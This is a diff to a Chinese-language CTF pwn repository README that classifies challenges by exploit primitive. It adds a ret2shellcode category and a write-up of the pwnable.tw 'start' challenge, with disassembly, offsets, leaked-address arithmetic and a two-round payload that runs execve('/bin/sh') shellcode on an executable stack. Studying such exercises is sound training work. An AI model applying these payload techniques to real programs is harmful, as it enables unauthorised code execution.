@@ -7,13 +7,14 @@
 
 ## 1. 分类原则
 
-本仓库目前按七类利用原语（exploit primitive）划分：
+本仓库目前按八类利用原语（exploit primitive）划分：
 
 | 模式目录 | 共同模式特征 | 判定核心 |
 | --- | --- | --- |
 | `network_interaction_free_shell` | 网络交互 / 白给 Shell | 程序自身执行 `system("/bin/sh")` 或 `execve("/bin/sh")`，没有可控输入点，利用只发生在网络层 |
 | `ret2text` | 栈溢出 + ret2text | 覆盖 saved RIP，跳转到二进制 `.text` 内已有的后门函数或代码片段 |
 | `ret2libc` | 栈溢出 + leak libc | 覆盖 saved RIP，先 leak libc 地址，再返回 libc 的 `system("/bin/sh")` |
+| `ret2shellcode` | 可执行内存 + shellcode | NX 关闭（`GNU_STACK=RWE`），leak 可执行内存地址后把 shellcode 写进去并跳转 |
 | `format_string_write` | 格式化字符串任意写 | `printf(user_input)`，用 `%n` 改全局变量 / GOT / 返回地址 |
 | `stack_local_var_overwrite` | 栈溢出改局部变量 / 条件绕过 | 只覆盖与缓冲区相邻的局部变量，使条件判断成立，不控制 RIP |
 | `heap_uaf` | 释放后使用 | free 后指针仍被引用，重新分配旧对象，改写函数指针 / vtable / 控制流 |
@@ -26,11 +27,13 @@
    └─ 没有，且程序直接给 shell → network_interaction_free_shell
 2. 输入是否被直接传给 printf？
    └─ 是 → format_string_write
-3. 溢出的目标是 saved RIP 吗？
+3. NX 是否关闭（`GNU_STACK=RWE`），且能拿到可执行内存的地址？
+   └─ 是 → ret2shellcode
+4. 溢出的目标是 saved RIP 吗？
    ├─ 是，且跳转到二进制内已有代码 → ret2text
    ├─ 是，但需要 leak libc 才能调用 system → ret2libc
    └─ 否，只是改相邻局部变量 → stack_local_var_overwrite
-4. 漏洞在堆上吗？
+5. 漏洞在堆上吗？
    ├─ free 后指针仍被引用，可重占旧对象 → heap_uaf
    └─ 需要操纵堆布局 / 分配器元数据 / 相邻对象指针 → heap_exploitation
 ```
@@ -61,6 +64,7 @@
 | 18 | `repeater` | canary leak + ret2libc / 64 位回显型溢出 | `ret2libc` | `puts(buf)` 泄 canary，`puts(read@got)` 泄 libc，回 `main` 二阶段 | **0x28**（canary 0x28，RIP 0x38） | `pop rdi;ret=0x400933`、`ret=0x400934`、`read@got=0x601030`、`main=0x4007d9` |
 | 19 | `pwnable_silverbullet` | 逻辑 bug 型栈越界 + ret2libc / 32 位 | `ret2libc` | `strncat` 的 NUL 打坏 `power`，`power` 与 `strlen(desc)` 失配后越界写；`beat` 获胜逼出 `main` 的 `ret` | 越界 **0x2f**（起点 `ebp-0x3`） | `read@plt=0x8048490`、`puts@plt=0x80484a8`、`read@got=0x804afd0`、`main=0x8048954` |
 | 20 | `bbbaby_pwn1` | 任意写 + canary 绕过 + ret2libc / 64 位 | `ret2libc` | 8 字节任意写把 `__stack_chk_fail@got` 改成 `leave;ret`，canary 失败反而成为栈迁移入口；CSU ROP leak libc 后把 `atoi@got` 改成 `system` | **0x110**（canary 0x108） | `leave;ret=0x40086a`、`csu_pop=0x4009fa`、`csu_call=0x4009e0`、`__stack_chk_fail@got=0x601020`、`atoi@got=0x601040` |
+| 21 | `pwnable_start` | ret2shellcode / 栈可执行 / 32 位静态汇编 | `ret2shellcode` | `read(0, esp, 0x3c)` 一次溢出即可覆盖返回地址，且 `push esp` 让栈地址天然泄漏；`GNU_STACK=RWE` 直接执行栈上 `execve("/bin/sh")` | **0x14**（shellcode 在 0x18） | `leak=0x8048087`、payload 基址 `leak-4`、shellcode 21 字节 |
 
 ---
 
@@ -513,6 +517,58 @@ case 1 @ 0x4008bb: puts("size:");    n = read_int(); read(0, buf, n)
 
 ---
 
+### 3.21 `21_pwnable_start` → `ret2shellcode`
+
+```text
+32 位 i386、静态汇编（564 字节）、No PIE（EXEC）、not stripped
+GNU_STACK = RWE（栈可执行）-> 这条决定了走 shellcode 而不是 ROP
+无 canary、无 libc
+```
+
+`_start @0x08048060`：
+
+```asm
+push esp                 ; [E-4] = E   <- 原始栈指针，泄漏源
+push 0x0804809d          ; 正常流程的伪返回地址（_exit）
+...  push "Let's start the CTF:"（5 次 push，20 字节）
+mov  ecx, esp            ; ecx = S = E-0x14
+mov  dl, 0x14
+mov  bl, 1
+mov  al, 4
+int  0x80                ; write(1, "Let's start the CTF:", 20)
+xor  ebx, ebx
+mov  dl, 0x3c
+mov  al, 3
+int  0x80                ; read(0, S, 0x3c)   <-- 唯一的溢出点
+add  esp, 0x14
+ret                      ; 取 [E-8]，已被覆盖
+```
+
+判定依据：
+
+1. `GNU_STACK=RWE` → 栈可执行，属于 `ret2shellcode` 的判定前提（见 §1 判定顺序第 3 条）。
+2. 溢出点只有 0x3c 字节，但足够放下 21 字节 shellcode + 4 字节返回地址。
+3. 泄漏点不是格式化字符串，而是 `push esp` 把栈地址留在栈上，再由
+   `0x08048087`（`mov ecx,esp` + `write`）打印出来。
+
+两轮利用：
+
+```text
+第 1 轮：'A'*0x14 + p32(0x08048087)      -> write(1, E-4, 20)，前 4 字节 = E
+第 2 轮：'A'*0x14 + p32(E-4+0x18) + shellcode
+         （第二次 read 的目标是 E-4，返回地址在 +0x14，shellcode 落在 +0x18）
+```
+
+坑点：
+
+- **payload 基址是 `leak-4` 而不是 `leak+4`**：`leak` 是 `push esp` 压进去的原值，
+  而第二次 `read` 从 `E-4` 开始写。按 `leak+4` 算会直接 SIGSEGV。
+- 本机 `gcc -m32` 链接失败（缺 32 位 crt），`asm(shellcraft.sh())` 不可用 → 手写 21 字节机器码。
+- 这题**不能做 SROP**：`int 0x80` 之前的 `mov al,3/4`、`inc eax` 都是写死的，
+  `eax` 无法置为 11（`rt_sigreturn`）。
+
+---
+
 ## 4. 仓库结构映射（重构前 → 重构后）
 
 | 重构前（按题目建目录） | 重构后（按模式归档） |
@@ -537,6 +593,7 @@ case 1 @ 0x4008bb: puts("size:");    n = read_int(); read(0, buf, n)
 | `repeater`（根目录散落） | `ret2libc/18_repeater_*`、`ret2libc/repeater` |
 | `pwnable_silverbullet`（根目录散落） | `ret2libc/19_pwnable_silverbullet_*`、`ret2libc/pwnable_silverbullet` |
 | `[陇原战"疫"2021网络安全大赛]bbbaby/pwn1`（根目录散落） | `ret2libc/20_bbbaby_pwn1_*`、`ret2libc/bbbaby_pwn1`、`ret2libc/libc-2.23.so` |
+| pwnable.tw `start`（外部下载，`_vendor/start`） | `ret2shellcode/21_pwnable_start_*`、`ret2shellcode/pwnable_start` |
 
 命名规则：
 
